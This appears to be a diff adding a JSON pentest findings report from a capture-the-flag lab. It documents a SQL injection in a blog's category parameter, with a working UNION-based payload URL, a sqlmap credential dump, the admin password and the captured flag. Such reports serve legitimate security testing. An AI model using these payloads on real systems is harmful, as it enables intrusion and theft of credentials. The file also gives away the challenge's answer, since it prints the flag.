@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:13:15.606324+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "143b58f9-2a3b-4d87-a611-dba12a180f97",
+      "timestamp": "2026-04-12T22:13:15.606222+00:00",
+      "title": "SQL Injection in category parameter leads to admin credential dump and flag extraction",
+      "severity": "critical",
+      "target": "http://172.17.0.1:40769/?category=Nature",
+      "description": "The index.php page accepts a 'category' GET parameter that is directly interpolated into a MySQL query without sanitization. An attacker can inject SQL to dump the admins table, obtaining admin credentials (admin:ONEverySecurePassword123!), and then authenticate to admin.php to retrieve the CTF flag.",
+      "evidence": "1. SQLi confirmed: category=Nature' causes SQL error: 'You have an error in your SQL syntax...near ''Nature'' ORDER BY created_at DESC'\n2. sqlmap dump of blogDB.admins table:\n  id=1, username=admin, password=ONEverySecurePassword123!\n3. POST /admin.php with username=admin&password=ONEverySecurePassword123! returns:\n  flag{ac81cf96-72fe-462f-8a3f-97d5cd189d42}",
+      "tool_used": "sqlmap, http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "1. GET http://172.17.0.1:40769/?category=Nature%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,CONCAT(username,0x3a,password),NULL,NULL,NULL%20FROM%20admins--%20-\n2. POST http://172.17.0.1:40769/admin.php  body: username=admin&password=ONEverySecurePassword123!",
+        "expected": "flag{ac81cf96-72fe-462f-8a3f-97d5cd189d42}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "33ad439d-e3b3-4732-9333-448f2bba57f1",
+      "timestamp": "2026-04-12T22:13:21.755708+00:00",
+      "title": "Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> IndexPHP[\"index.php GET /?category=\"]\n  Browser --> AdminPHP[\"admin.php POST login\"]\n  IndexPHP --> MySQL[\"MySQL blogDB\"]\n  MySQL --> PostsTable[\"posts table\"]\n  MySQL --> AdminsTable[\"admins table (SQLi dump)\"]\n  AdminPHP --> AdminsTable\n  AdminsTable --> Flag[\"flag returned on login\"]"
+    }
+  ]
+}
